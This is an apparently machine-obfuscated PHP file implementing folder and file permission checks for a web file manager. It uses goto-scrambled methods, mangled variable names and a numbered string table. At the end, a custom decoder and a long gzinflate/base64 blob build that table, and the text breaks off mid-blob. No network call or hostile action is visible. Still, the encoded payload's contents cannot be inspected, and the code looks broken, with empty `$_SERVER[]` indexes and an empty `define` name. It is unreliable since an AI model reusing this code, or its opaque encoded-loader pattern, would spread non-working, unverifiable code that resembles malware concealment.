$B[$bվ][0]; $B[$bվ] = !1; } } $B = array_filter(array_values($B)); $a = array_merge($B, $a); goto Eě; AϞ: $b = Model($B䃍[1223])->sourceInfo($B); $B = array(); $A払 = 1; goto cٮ؃; d: } public function setAllChildrenByUser($C⩑, $b׎, $eӦ) { $e꫃ =& $_SERVER[]; $D = $this->getAllChildrenByUser($C⩑, $b׎); if (!$eӦ || !$D) { return !1; } foreach ($D as $bĝ) { $fڏ = array(); foreach ($bĝ[$e꫃[1889]] as $eůμ) { $Dֽស = $eůμ[$e꫃[460]]; $Fϐ = $eůμ[$e꫃[1546]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $b = $eůμ[$e꫃[1546]] ? $eůμ[$e꫃[1546]] : $eůμ[$e꫃[1715]]; if ($eůμ[$e꫃[1546]] && $eůμ[$e꫃[1546]] == $b׎) { continue; } $fڏ[] = array($e꫃[397] => $bĝ[$e꫃[397]], $e꫃[406] => $Fϐ, $e꫃[498] => intval($b), $e꫃[1815] => isset($Dֽស[$e꫃[395]]) ? intval($Dֽស[$e꫃[395]]) : 0, $e꫃[1869] => isset($Dֽស[$e꫃[1869]]) ? intval($Dֽស[$e꫃[1869]]) : -1); } $fڏ[] = array($e꫃[397] => $bĝ[$e꫃[397]], $e꫃[406] => SourceModel::TYPE_USER, $e꫃[498] => intval($b׎), $e꫃[1815] => intval($eӦ), $e꫃[1869] => -1); $this->where(array($e꫃[412] => $bĝ[$e꫃[397]]))->delete(); $this->addAll($fڏ); } return !0; } public function get($a질) { $eԳ = $this->getSourceList(array($a질), !0); return $eԳ[0]; } public function getSourceList($C, $c = false, $aȜ = false) { goto Cڄ; F: foreach ($c as $D => $A嬑) { $c䴍 = $DϮݘ->parentLevelArray($A嬑[$A[515]]); $C = array_merge($C, array($D), array_reverse($c䴍)); } $C = array_values(array_unique($C)); if (!$C) { return array(); } goto dߠ҈; Dċ: $Eߐ = array(); foreach ($c as $b̸ => $D䉎) { if ($cНڃ) { $Eߐ[$b̸] = $fϙ; continue; } $Eߐ[$b̸] = $this->makeSourceAuth($D䉎, $c񃬶ϛ, $aȜ); } return $Eߐ; goto D; Cڄ: $A =& $_SERVER[]; if (!$C) { return array(); } $DϮݘ = Model($A[1223]); goto bȡ䐾; bȡ䐾: if (!$c && count($C) == 1) { $c = array(); $c[$C[0]] = $DϮݘ->sourceInfo($C[0]); } if (!$c) { $b = array($A[412] => array($A[413], $C)); $c = $DϮݘ->field($A[1893])->where($b)->select(); $c = array_to_keyvalue($c, $A[397]); } $C = $C; goto F; dߠ҈: $fԆ = $this->sourceAuthSelect($C); $c񃬶ϛ = array(); foreach ($C as $b̸) { if (isset($fԆ[$b̸])) { $c񃬶ϛ[$b̸] = $fԆ[$b̸]; } } goto dҴ; dҴ: $cНڃ = $this->userIsRoot($aȜ); $dϵ = AuthModel::authAll(); $fϙ = array($A[409] => $dϵ, $A[1894] => array($A[414] => 0, $A[1721] => $dϵ, $A[415] => LNG($A[1895]), $A[1737] => $A[1896])); goto Dċ; D: } public function authDeepCheck($D, $eՖ = false) { goto d; c: if (!$a͢) { return !1; } $fō = $a͢ ? $a͢[0] : $D; return array($D׽[409] => -1, $D׽[460] => array($D׽[414] => $D׽[1102], $D׽[1721] => $D׽[191], $D׽[415] => LNG($D׽[1899]), $D׽[1737] => $D׽[1900]), $D׽[1901] => LNG($D׽[1902]), $D׽[1903] => $this->sourceAuthInfo($fō)); goto B؊; d: $D׽ =& $_SERVER[]; $eՖ = $eՖ ? $eՖ : USER_ID; $e = $this->makeAuthDeep($eՖ); goto B; B: if (!in_array($D, $e[$D׽[1897]])) { return !1; } $a͢ = array(); foreach ($e[$D׽[1898]] as $F𬶧 => $eы) { if (!in_array($D, $eы)) { continue; } $a͢[] = $F𬶧; } goto c; B؊: } protected function makeAuthDeep($d = false) { goto Bѯ; Bѯ: $ḏ =& $_SERVER[]; static $Bꃇ = array(); $d = $d ? $d : USER_ID; goto F; B̴: $B΄ʳ = $d; $A払 = Model($ḏ[1223]); $CŸ = Model($ḏ[516]); goto f; cɵ: $Bު = array($ḏ[1897] => $A, $ḏ[1898] => $BŽּ); $Bꃇ[$d] = $Bު; return $Bު; goto e; f: $BŽּ = array(); $aͰ = array(); $D = array(); goto aĳ۳; B: $E = $B΄ʳ; foreach ($E as $cꧥ߈) { $aۅ = $CŸ->getInfo($cꧥ߈); $eɩ = $A払->parentLevelArray($aۅ[$ḏ[515]]); $B΄ʳ = array_merge($B΄ʳ, $eɩ); } $B΄ʳ = array_values(array_unique($B΄ʳ)); goto Dב; F: if (isset($Bꃇ[$d])) { return $Bꃇ[$d]; } $b = Model($ḏ[1904])->listData(); $b = array(); goto B; aĳ۳: $c = array(); if ($c욏) { $e؋ = $A払->where(array($ḏ[397] => array($ḏ[413], $c욏)))->select(); foreach ($e؋ as $D) { $eɩ = $A払->parentLevelArray($D[$ḏ[515]]); $A = array_merge($A, $eɩ); $B΄ʳ[] = $D[$ḏ[498]]; $BŽּ[$D[$ḏ[397]]] = $eɩ; $aͰ[$D[$ḏ[397]]] = $D[$ḏ[498]]; } } $B΄ʳ = array_values(array_unique($B΄ʳ)); goto B; Dב: foreach ($B΄ʳ as $cꧥ߈) { $aۅ = $CŸ->getInfo($cꧥ߈); $A[] = $aۅ[$ḏ[85]][$ḏ[397]]; $D[$cꧥ߈] = $aۅ[$ḏ[85]][$ḏ[397]]; $c[$cꧥ߈] = $A払->parentLevelArray($aۅ[$ḏ[515]]); } foreach ($BŽּ as $e吓Ć => $F༩) { $FՃ = $aͰ[$e吓Ć]; if (!$FՃ || !$D[$FՃ]) { continue; } $bڞ = array(); foreach ($c[$FՃ] as $cꧥ߈) { $bڞ[] = $D[$cꧥ߈]; } $BŽּ[$e吓Ć] = array_merge($bڞ, $F༩); } $A = array_values(array_unique($A)); goto cɵ; B: foreach ($b as $d΋) { if ($d΋[$ḏ[408]] == 0 && $d΋[$ḏ[1736]] == $ḏ[87]) { $b[] = $d΋[$ḏ[395]]; } } $d = $this->userGroupParents($d); $a = array($ḏ[406] => SourceModel::TYPE_USER, $ḏ[498] => $d); goto C; bھƎ: $cۍӱ = array_to_keyvalue_group($A, $ḏ[397]); foreach ($cۍӱ as $Cǡ => $A×) { $Bɖ = $this->authArrayCheck($A×, $d); if ($Bɖ[$ḏ[409]] > 0) { $c욏[] = $Cǡ . $ḏ[33]; } } $A = array(); goto B̴; C: if ($d) { $a = array(array($ḏ[406] => SourceModel::TYPE_USER, $ḏ[498] => $d), array($ḏ[406] => SourceModel::TYPE_GROUP, $ḏ[498] => array($ḏ[413], $d)), $ḏ[976] => $ḏ[1807]); } $A = $this->field($ḏ[1905])->where($a)->select(); $c욏 = array(); goto bھƎ; e: } private function makeSourceAuth($fٌ, $e, $B = false) { goto C; aڹ: $D = $fٌ[$f[406]] == SourceModel::TYPE_GROUP; $e = $D ? $this->groupRootAuth($dꈔ, $B) : !1; if ($e && Model($f[501])->authCheckAction($e[$f[408]], $f[1735])) { return $this->groupAuthInfo($e, $dꈔ); } goto f; Cĉ: if (!$Bψ) { $dǽǆ = Model($f[516])->getInfo($dꈔ); $CѸ = explode($f[47], trim($dǽǆ[$f[515]], $f[47])); $CѸ = array_reverse($CѸ); foreach ($CѸ as $eԩӅ) { if ($eԩӅ == $f[191] || $eԩӅ == $fü) { continue; } $Dܰ = $this->groupRootAuth($eԩӅ, $B); if (!$Dܰ) { continue; } $Bψ = $this->groupAuthInfo($Dܰ, $eԩӅ); break; } } if (!$Bψ || $Bψ[$f[409]] <= 0) { $aܛ = $this->authDeepCheck($fٌ[$f[397]], $B); if ($aܛ) { $Bψ = $aܛ; } } return $Bψ; goto Fԛڟ; f: $Cی = Model($f[1223])->parentLevelArray($fٌ[$f[515]]); $Cی = array_merge(array($fٌ[$f[397]]), array_reverse($Cی)); $Bψ = !1; goto DΈ; C: $f =& $_SERVER[]; $fü = $f[87]; $dꈔ = $fٌ[$f[498]]; goto aڹ; DΈ: foreach ($Cی as $dο) { if (!isset($e[$dο])) { continue; } $fص = $this->authMake($e[$dο], $B); if ($fص[$f[460]]) { $Bψ = $fص; break; } } if (!$D) { return $Bψ; } if (!$Bψ && $e) { $Bψ = $this->groupAuthInfo($e, $dꈔ); } goto Cĉ; Fԛڟ: } private function userIsRoot($EǪ = false) { $dϭ䖋 =& $_SERVER[]; if (!$EǪ && _get($GLOBALS, $dϭ䖋[499])) { return !0; } $aڠٳ = Model($dϭ䖋[532])->getInfo($EǪ); $Eڔ쓿 = Model($dϭ䖋[1906])->listData($aڠٳ[$dϭ䖋[1429]]); if ($Eڔ쓿 && $Eڔ쓿[$dϭ䖋[505]][$dϭ䖋[1907]] == 1) { return !0; } return !1; } private function sourceAuthInfo($a՜Ŏ) { goto e; e: $CѺ =& $_SERVER[]; $b޻ = Model($CѺ[1223]); $CӼ = $b޻->sourceInfo($a՜Ŏ); goto EȍƗ; EȍƗ: if (!$CӼ) { return !1; } $b޻->groupPathDisplay($CӼ); $CߟȬ = array($CӼ); goto D; d҈: if (isset($CӼ[$CѺ[521]])) { $BŊ = explode($CѺ[8], trim($CӼ[$CѺ[513]], $CѺ[8])); array_shift($BŊ); $B = $CӼ[$CѺ[519]] . $CѺ[1908] . implode($CѺ[8], $BŊ); } return array($CѺ[415] => $CӼ[$CѺ[28]], $CѺ[76] => KodIO::make($CӼ[$CѺ[397]]), $CѺ[1909] => $B); goto Aʐ; D: $CߟȬ = $b޻->_listAppendPath($CߟȬ); $CӼ = $CߟȬ[0]; $B = $CӼ[$CѺ[513]]; goto d҈; Aʐ: } private function groupAuthInfo($B֡߭, $b) { $fǃ =& $_SERVER[]; $FǦ = Model($fǃ[516])->getInfo($b); return array($fǃ[1910] => intval($B֡߭[$fǃ[408]]), $fǃ[1894] => $B֡߭, $fǃ[1911] => LNG($fǃ[1912]), $fǃ[1903] => array($fǃ[415] => $FǦ[$fǃ[28]], $fǃ[76] => KodIO::make($FǦ[$fǃ[85]][$fǃ[397]]), $fǃ[1909] => $FǦ[$fǃ[520]])); } protected function groupRootAuth($cҺ, $cަ = false) { goto fڇ; b缓: static $e΅վ = array(); if (isset($e΅վ[$Cۍݵ])) { return $e΅վ[$Cۍݵ]; } $BԈ = Model($f꫼[516])->getInfo($cҺ); goto C; C: $f = $this->userGroupList($cަ); $A = isset($f[$cҺ]) ? $f[$cҺ][$f꫼[408]] : !1; if ($A && Model($f꫼[501])->authCheckAction($A[$f꫼[408]], $f꫼[1735])) { $e΅վ[$Cۍݵ] = $A; return $A; } goto cҧ; f: $e΅վ[$Cۍݵ] = $A硨 ? $A硨 : $A; return $e΅վ[$Cۍݵ]; goto EŽ; cҧ: $C = $this->sourceAuthSelect($BԈ[$f꫼[85]][$f꫼[397]]); $d = $C ? $this->authMake($C, $cަ) : !1; $A硨 = $d ? $d[$f꫼[460]] : !1; goto f; fڇ: $f꫼ =& $_SERVER[]; $cަ = $cަ ? $cަ : USER_ID; $Cۍݵ = $cަ . $f꫼[1913] . $cҺ; goto b缓; EŽ: } public function authOwnerApply($c) { goto AӴ; aͭި: $cҌ = array(); $Dń = array(); foreach ($cԧ as $e޻ => $a뤎) { $cތ = $this->authFolderOwnerUser($a뤎); $cҌ[$e޻] = $cތ; $Dń = array_merge($Dń, $cތ[$f뭥Կ[588]]); if ($cތ[$f뭥Կ[1915]]) { break; } } goto eʡ; AӴ: $f뭥Կ =& $_SERVER[]; if (empty($c[$f뭥Կ[408]]) || isset($c[$f뭥Կ[1914]]) && $c[$f뭥Կ[1914]]) { return $c; } if (AuthModel::authCheckRoot($c[$f뭥Կ[408]][$f뭥Կ[409]])) { return $c; } goto fň; eʡ: if (count($Dń) == 0) { $Dń = $this->authFolderOwnerGroup($c[$f뭥Կ[498]]); } $Dń = array_unique($Dń); if (AuthModel::authCheckRoot($c[$f뭥Կ[408]][$f뭥Կ[409]])) { $Dń[] = USER_ID; } goto cЭ; cЭ: $c[$f뭥Կ[408]][$f뭥Կ[1916]] = Model($f뭥Կ[507])->userListInfo($Dń); return $c; goto a̓Ў; fň: $Fⱎ = Model($f뭥Կ[1223])->parentLevelArray($c[$f뭥Կ[515]]); $Fⱎ = array_merge(array($c[$f뭥Կ[397]]), array_reverse($Fⱎ)); $cԧ = $this->sourceAuthSelect($Fⱎ); goto aͭި; a̓Ў: } private function authFolderOwnerGroup($C͎) { $dᨤɚ =& $_SERVER[]; $c펕 = Model($dᨤɚ[1801])->where(array($dᨤɚ[1715] => $C͎))->select(); $b⢥ = array(); if (!$c펕) { return $b⢥; } foreach ($c펕 as $Aߜ) { $dӇ = $this->authInfo($Aߜ); if (AuthModel::authCheckRoot($dӇ[$dᨤɚ[408]])) { $b⢥[] = $Aߜ[$dᨤɚ[1546]]; } } return $b⢥; } private function authFolderOwnerUser($dċ) { $f𜓄 =& $_SERVER[]; $f = array(); $a = !1; foreach ($dċ as $C㡱) { $a¾ = $this->authInfo($C㡱); if ($C㡱[$f𜓄[498]] == $f𜓄[191]) { $a = !0; } if ($C㡱[$f𜓄[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a¾[$f𜓄[408]])) { $f[] = $C㡱[$f𜓄[498]]; } } } return array($f𜓄[588] => $f, $f𜓄[1915] => $a); } public function authMake($E򳩮ډ, $dݏ = false) { $C؏ =& $_SERVER[]; $B = $this->authArrayCheck($E򳩮ډ, $dݏ); if ($B[$C؏[1917]]) { $B[$C؏[1917]] = $this->sourceAuthInfo($B[$C؏[1917]]); } return $B; } public function authArrayCheck($dȞ, $EƄ = false) { goto E; D۞: $dߕ = 1000; $aΓ = 0; $b碵̹ = 0; goto bՋڂ; Fݾ: $f = 0; $A񤉛 = 0; $C̛ = 0; goto dò; b죖: return $e; goto Eم; E: $F =& $_SERVER[]; if (!$dȞ) { return array($F[409] => 0, $F[460] => !1); } $EƄ = $EƄ ? $EƄ : USER_ID; goto Fݾ; bՋڂ: $dȜ֡ = 0; $aę = 0; $cՕ = array($F[397] => 0); goto A; A: foreach ($dȞ as $cՕ) { $cД = $this->authInfo($cՕ); if (!$cД) { continue; } $FӃ = $cՕ[$F[498]]; $cߦ = intval($cД[$F[408]]); if ($cՕ[$F[406]] == SourceModel::TYPE_USER && $FӃ == $EƄ) { $f = !0; $C̛ = $cД; $A񤉛 = $cߦ; } else { if ($cՕ[$F[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($FӃ, $EƄ)) { $eߘ = !0; $Bː = $this->groupStepToUserGroup($FӃ, $EƄ); if ($Bː < $dߕ) { $dߕ = $Bː; $aط = $cߦ; $c = $cД; $aΓ = $FӃ; } if ($Bː == $dߕ && $cߦ >= $aط) { $aط = $cߦ; $c = $cД; $aΓ = $FӃ; } } else { if ($FӃ == $F[191]) { $b碵̹ = !0; $aę = $cД; $dȜ֡ = $cߦ; } } } } if ($f) { $B뙷 = $A񤉛; $cД = $C̛; $Dϴ = LNG($F[1918]); } else { if ($eߘ) { $B뙷 = $aط; $cД = $c; $Eބ = Model($F[516])->getInfo($aΓ); $Dϴ = $F[160] . $Eބ[$F[520]] . $F[1919] . LNG($F[1920]); } else { if ($b碵̹) { $B뙷 = $dȜ֡; $cД = $aę; $Dϴ = LNG($F[1891]); } else { $B뙷 = 0; $cД = !1; $Dϴ = $F[33]; } } } $e = array($F[1910] => intval($B뙷), $F[1894] => $cД, $F[1911] => $Dϴ, $F[1903] => $cՕ[$F[397]]); goto b죖; dò: $eߘ = 0; $aط = 0; $c = 0; goto D۞; Eم: } private function groupContainUser($E六, $d܍ = false) { return in_array($E六, $this->userGroupParents($d܍)); } private function groupStepToUserGroup($dӹ, $e־ = false) { goto F; Bσ: $F = $GLOBALS[$aǒ[6]][$aǒ[88]][$aǒ[1812]] == 1; $aĳݥ = $F ? 3 : 2; foreach ($e as $f) { if ($f[$aǒ[1715]] == $dӹ) { return 0; } $F貈 = explode($aǒ[47], trim($f[$aǒ[515]], $aǒ[47])); if ($F貈[0] == $aǒ[191] && count($F貈) > $aĳݥ) { $B狉 = array_reverse(array_slice($F貈, $aĳݥ)); $A󨅐 = array_search($dӹ, $B狉); if ($A󨅐 !== !1 && $A󨅐 + 1 <= $F☃) { $F☃ = $A󨅐 + 1; } } } goto e; e: return $F☃; goto Dã; F: $aǒ =& $_SERVER[]; $e = $this->userGroupList($e־); $F☃ = 1000; goto Bσ; Dã: } private function userGroupList($AՌ = false) { $aܤ =& $_SERVER[]; static $Aː = array(); if (isset($Aː[$AՌ])) { return $Aː[$AՌ]; } $eԖ = Model($aܤ[532])->getInfo($AՌ); $Aː[$AՌ] = array_to_keyvalue($eԖ[$aܤ[1892]], $aܤ[1715]); return $Aː[$AՌ]; } public function userGroupParents($DŒͺ) { goto f됾; cͶق: if (isset($Fٖ[$DŒͺ])) { return $Fٖ[$DŒͺ]; } $DΦȝ = $this->userGroupList($DŒͺ); $aل粂 = array(); goto e鵴; C: $Fٖ[$DŒͺ] = array_unique($aل粂); return $Fٖ[$DŒͺ]; goto fΛ; e鵴: $fڲʅ = $GLOBALS[$aͿ[6]][$aͿ[88]][$aͿ[1812]] == 1; $Fۇ = $fڲʅ ? 3 : 2; foreach ($DΦȝ as $eƂ) { $c = array($eƂ[$aͿ[1715]]); $dг = explode($aͿ[47], trim($eƂ[$aͿ[515]], $aͿ[47])); if ($dг[0] == $aͿ[191] && count($dг) > $Fۇ) { $D˰ = array_slice($dг, $Fۇ); $c = array_merge($c, array_reverse($D˰)); } $aل粂 = array_merge($aل粂, $c); } goto C; f됾: $aͿ =& $_SERVER[]; static $Fٖ = array(); $DŒͺ = $DŒͺ ? $DŒͺ : USER_ID; goto cͶق; fΛ: } public function authTargetInfoMake($aⱯ) { goto D; F: return array($bڏ[1922] => $e, $bڏ[1923] => $D۽媙); goto b̰; aƃ: foreach ($aⱯ as $D̂) { if ($D̂[$bڏ[406]] == SourceModel::TYPE_USER) { $e[] = intval($D̂[$bڏ[498]]); } else { if ($D̂[$bڏ[406]] == SourceModel::TYPE_GROUP) { $D۽媙[] = intval($D̂[$bڏ[498]]); } } } if ($e) { $e = Model($bڏ[507])->userListInfo($e); } if ($D۽媙) { $b = array($bڏ[1799] => array($bڏ[413], $D۽媙)); $D۽媙 = Model($bڏ[516])->field($bڏ[1921])->where($b)->select(); $D۽媙 = array_to_keyvalue($D۽媙, $bڏ[1715]); } goto F; D: $bڏ =& $_SERVER[]; $e = array(); $D۽媙 = array(); goto aƃ; b̰: } public function authInfo($Cӌϴ) { $E =& $_SERVER[]; if ($Cӌϴ[$E[1815]]) { $bɏ = Model($E[501])->listData($Cӌϴ[$E[1815]]); if (!$bɏ) { return !1; $A = Model($E[501])->listData(); $e⠘ = array_filter_by_field($A, $E[408], $E[191]); return $e⠘; } $F = array_field_key($bɏ, array($E[395], $E[28], $E[408], $E[1737], $E[1738])); $F[$E[1924]] = $Cӌϴ; return $F; } else { return array($E[414] => 0, $E[1721] => $Cӌϴ[$E[1869]], $E[415] => $E[33], $E[1737] => $E[1925]); } } } goto Eɮ; eӘ: if (!function_exists('_kodDe')) { function _kodDe($d濍) { $d濍 = base64_decode($d濍); $FԺǊ = strlen($d濍); $D؍ = ''; $A܉狐 = ord($d濍[0]) - 30; for ($Fʆ = 1; $Fʆ < $FԺǊ; $Fʆ += 2) { if ($Fʆ + 1 < $FԺǊ) { $D؍ .= chr(ord($d濍[$Fʆ + 1]) + $A܉狐); $D؍ .= chr(ord($d濍[$Fʆ]) + $A܉狐); } else { $D؍ .= chr(ord($d濍[$Fʆ]) + $A܉狐); } } return $D؍; } } define(strrev(''), "\xc0\xcf\xf3\xfe\xc2\xdd"); $_SERVER[] = explode(base64_decode('fAF8BXwF'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\305\175\7\174\33\105\366\60\160\300\221\160\300\1\241\267\215\41\270\104\305\166\272\23\307\221\145\331\26\221\55\107\222\323\154\243\254"."\245\265\264\266\244\225\167\127\226\235\102\13\204\203\100\102\2\4\102\71\72\204\226\320\353\205\16\107\157\241\345\40\34\45\116\102\47\334\35\355\50\377\351\63\273\122\340"."\377\375\276\357\367\373\362\113\242\235\67\375\315\233\67\357\315\274\171\363\320\372\257\317\135\274\373\342\275\26\357\365\306\3\217\134\360\350\172\374\275\170\117\360\157\167\374".strrev('mmN/˷7˷=i#沲Cv}}')."\357\346\353\252\135\133\3\22\343\274\65\370\107\312\150\246\244\14\252\206\151\140\100\114\313\364\250\11\374\255\146\360\257\33\377\30\375\51\325\124\360\167\264\65\30\211\206"."\333\333\332\174\241\110\224\224\50\306\247\265\70\371\312\312\272\234\46\205\147\25\335\0\125\211\305\105\263\132\126\311\130\40\34\20\227\115\271\133\66\110\111\15\365\321\6"."\x5f\x5b\x20\x38\x2f\x1a\x99\xd7\xe6\x23\x29\xba\xa3\xfd\x39\x45\x1f\xc2\x21\xf4\x19\x36\x65\xdd\x8c\xa8\x69\x85\xa5\xc8\xeb\xac\x5d\xf5\xbe\x26\x7f\xab\x14\x9\x79\x5a\xc3\x1e\x6f\xc4\x1f"."\154\305\140\157\260\245\305\37\51\204\207\202\201\100\275\307\73\263\60\246\55\344\151\152\361\110\240\175\51\45\252\146\172\264\62\151\1\216\131\40\225\343\217\106\125\111\305".base64_decode('8WdGps0xh7LkK8K+wBhkcqkUDrSyL9J+pUfOpQjOGsRAVlfTMu36TGWIQfGHnDM=')."\x35\x35\x13\xc3\x1\xdf\xa0\xa9\xcb\x1c\xe\x5a\x1c\xd3\x95\xb4\x92\x21\x45\x85\x7d\x1\x9f\x37\x22\xc1\x66\x4a\x8d\xa1\x60\x8b\x44\x86\x22\x2d\x1b\xa6\xa2\x4b\x73\x9a\x7d\x21\x9f\x4\x9b"."\136\133\212\172\134\52\341\174\355\255\0\41\222\47\20\220\166\125\202\251\244\263\264\30\234\247\110\141\301\120\203\57\44\325\317\223\70\236\142\132\72\255\145\134\240\24\60".strrev('G*r2(KRd'."\0".'VntXll$t8~?(_TЦ').base64_decode('kh/yqxmEgPvVjJojxEqK0DQ2c8hHjqZWKESJk480yK+RyQVm2gD+rJ2Of6eSRN0=')."\x51\x18\xa7\xe8\x66\x54\xc9\xc4\xb4\xb8\x9a\x21\xf3\xb1\x8e\xcc\x3d\x42\x81\xb2\x99\x6c\xd0\x55\x90\x8e\x14\xa8\xb9\x62\x5a\x76\xa8\x45\x1b\x20\x9d\xe9\x51\x53\x4a\x80\x4d\xb7\x1e\x2d\x15"."\127\164\36\316\202\354\142\14\351\225\272\120\310\335\232\113\213\111\130\60\226\124\123\161\235\316\322\337\112\11\370\200\332\63\304\147\243\241\345\364\230\342\7\363\205\347\155"."\x63\x2d\xa9\x22\x89\x14\xd3\x4\x9d\x36\x68\xbf\xda\xb3\x29\x4d\x8e\x87\x15\x5d\xe8\x6b\x23\xc8\x18\xcc\x99\x22\x30\x87\x92\x35\x6a\x7a\xba\x1\xf0\xd\x52\x3f\x98\x2d\x6a\x7b\x91\x88\x3e".base64_decode('Ol/iAgpdhN+VdZzu/KWrYwb4r5wwv07StKSSSkWVQYXMq3R8gkH76ja61YwbQHA=')."\320\37\214\46\145\43\331\22\237\20\105\271\50\117\215\53\203\256\154\62\113\246\76\233\355\235\26\272\207\243\323\252\231\76\201\63\247\264\230\234\22\173\212\277\223\246\231".base64_decode('DSuZOEQI6ZGWzyCEZRWFJGpwSHGpRZonNdeoNQbNmE6xL9o7BjMY0BwkFFNCwso=')."\xa0\x49\x90\x22\x4d\x8d\x25\x65\x1d\xc\x57\x6d\xce\xec\x71\x4e\x26\xfc\x25\x9b\x4d\xa9\x31\xd9\x54\xb5\x8c\x5b\x8b\x99\x8a\xe9\x34\x4c\x5d\x91\x49\x69\x9e\x58\x4c\x31\xc\xa7\x57\xcb\x98"."\xba\x96\x72\x7a\x52\x29\x2d\xef\xc\xea\x6a\x42\xcd\xd4\x48\x15\x84\x1b\x83\x48\x30\xdf\x9d\x90\x43\xd6\x90\x49\x5c\x32\x55\x82\xb4\x2\x19\x44\x5\xae\x8d\x4e\x4e\x96\x5a\x97\x33\x46\x8f"."\xa2\x3b\x7d\x64\xd2\xd4\x48\x60\x3c\x18\x83\xa4\xc9\x1a\x54\x23\xab\x19\x2a\x6c\x5e\x8d\x24\x9b\xa6\x1c\x4b\x42\xe6\xc2\x8b\xaf\xfd\x8d\xf4\x6a\x26\xa5\x66\x94\x82\xb4\xbe\xc1\xac\xaa\x2b"."\6\155\253\324\324\22\41\205\200\322\25\147\233\56\47\322\162\215\224\315\165\3\314\220\331\133\4\206\123\23\324\324\110\61\30\164\110\351\234\141\72\165\5\160\51\25\254"."\207\144\214\375\75\316\26\70\265\124\45\356\14\3\146\116\300\343\52\307\113\200\154\44\32\207\241\315\221\110\133\324\337\10\326\354\126\137\264\305\23\361\66\223\146\233\162".strrev('B&'."\n".'4]R5CA^Zm'."\n".'Մ:+4X'."\0".'9')."\232\316\220\234\111\100\374\164\17\231\12\41\77\143\40\141\105\164\100\311\44\314\44\315\30\366\205\146\373\102\321\160\260\61\62\307\23\42\253\175\6\120\311\40\255\12\26"."\235\162\206\224\70\100\175\314\244\371\344\54\304\32\115\3\47\6\34\53\32\13\47\13\215\13\370\233\40\142\32\234\6\110\344\24\123\321\262\3\152\132\205\155\67\131\14".strrev('D(JwyVUU\'rβɝC܃H$')."\123\22\351\164\101\212\112\51\70\363\67\20\0\227\56\141\132\333\120\207\201\41\337\254\166\137\70\22\155\361\105\232\203\15\244\6\237\207\174\5\64\74\65\151\217\72\360".strrev('bJZb§I"j+68N5ƫ'."\n".'tjiq0cO')."\x15\xca\x59\x12\x6a\xf\x19\x1f\xcc\x30\x79\x20\xac\xa6\xb3\x94\xaf\x99\xc9\x5c\xba\x5b\xf8\xa4\x62\x29\x18\x6f\xba\xbc\x24\x35\xb6\xbc\x69\x3a\xf9\xaa\x71\x93\x84\x63\xaa\x1b\x29\x67\x76"."\207\307\201\277\234\15\307\265\264\114\245\135\304\222\224\70\346\111\30\124\141\211\151\126\144\276\136\232\272\251\101\250\156\111\322\242\230\111\215\14\122\102\241\115\312\261\266"."\321\126\306\225\224\102\261\221\124\50\113\257\44\311\300\312\304\160\325\303\330\73\20\334\0\224\57\251\252\21\2\71\241\40\105\303\163\240\274\313\1\46\113\232\2\253\111"."\260\273\27\114\27\42\111\250\106\243\260\370\107\65\24\7\32\57\363\364\155\272\322\243\222\111\227\1\43\326\42\353\175\64\3\30\41\276\354\300\200\120\130\143\173\40\20"."\365\6\133\43\100\206\306\220\71\41\177\304\107\151\324\323\20\365\170\333\330\42\312\107\234\44\200\14\243\160\65\300\220\201\152\141\45\342\113\26\147\346\164\251\205\314\32"."\177\3\356\234\325\62\206\342\214\221\322\342\234\255\343\24\123\155\74\275\40\7\227\334\7\235\162\172\241\63\15\320\344\144\115\267\256\260\122\104\134\250\375\144\134\71\373".strrev('H޲Ng&ZG'."\0".'T-*$mBa]')."\13\145\336\307\72\332\36\122\366\140\72\305\5\102\153\257\234\174\54\42\315\376\326\231\321\226\140\203\57\20\365\267\2\276\24\51\204\267\267\65\170\350\340\212\360\372\140".base64_decode('pNkCbQecabYn4Lcn9831hyPholEA1u6zxQBdsC3ka/TPZcFGvy/QEI56Pd5mnqY=')."\xd5\xd3\x42\x2\xd1\x1e\xa8\x8d\x19\x6e\x6b\xfa\x28\x60\xb1\x61\xa6\xd3\x45\x7\xa0\x7e\x4a\x91\x15\xb5\x28\x50\x51\xaa\x1a\x44\x39\x1d\x80\xe5\x52\x21\xb4\x47\xba\xb\xb5\x62\xd4\x13\x22"."\xa3\xc7\xb4\x1c\xa5\x46\x26\x26\xa6\x29\x57\x49\xcb\x64\x5a\xc9\x74\x29\x2c\xc3\x3f\xe5\x92\x27\x2c\x99\xd9\x28\xe3\x1f\xdd\x43\xec\x13\x75\x83\x86\x81\x40\x48\xea\x97\x8\xbb\x2f\x68\x41"."\24\246\251\127\172\30\347\56\16\360\364\230\214\13\330\302\140\136\360\70\60\2\36\244\176\3\112\100\43\22\245\163\315\0\372\212\207\66\247\207\253\276\321\140\233\57\344"."\x81\x8a\x73\x74\x4e\x28\xd8\xda\x44\x32\xe4\x93\xa\x6d\x80\x9f\xa0\xbf\x8c\x8a\x4f\x44\x7f\x36\x39\xb\x3\xb2\x8f\x4c\x55\x28\x8e\xf4\x5e\x8d\xa2\x72\x31\xfe\x39\x11\xff\x0\xb1\x8f\x54"."\256\144\50\326\273\41\67\147\214\201\352\104\140\66\120\116\254\345\130\155\335\232\226\242\363\24\110\0\214\37\60\315\273\327\240\104\62\110\231\317\130\272\244\221\25\45\22".strrev('O"`+	c]tR?u:a|G'."\n".'QA'."\0".'1!Rk')."\xee\xcc\x8f\x2d\xeb\x70\x8e\x75\x75\x81\x8f\xf2\x8a\x19\x38\x48\x42\x9d\x2e\x4b\xf0\x4\x92\x3f\xa7\xb3\xdc\x50\x30\x2a\x33\xea\xca\x6b\x3a\xdd\x9d\xee\xb2\xba\x9a\xe\x8f\x73\xa1\xec\x5c"."\130\351\234\342\354\32\333\351\52\37\113\0\135\213\252\35\343\227\300\4\40\141\335\361\135\340\247\266\263\156\114\247\363\304\123\26\314\350\350\354\52\255\31\73\272\323\165".base64_decode('fGe+q6K8jtYTy+lAWYwNsabGx5aBJgGBiSXJIJYnJKARC9Ushy6auITCwRgqCZ4=').base64_decode('o8PZObarTsgngOx1AWEJ8N8kS+dxzoc9Y1nhvCf0kcvEOPeE86JbjhE+oCYybAo=')."\1\51\200\51\351\126\71\175\321\30\374\273\204\16\144\102\31\244\254\41\323\243\352\204\72\163\31\265\237\356\101\144\224\176\362\241\231\224\276\273\25\63\257\120\362\0\160".base64_decode('SxgQB1UMQZQQSiGxkNTAFTQFaSukF9kolMnyLBRXMmScRpDURkzOKmGh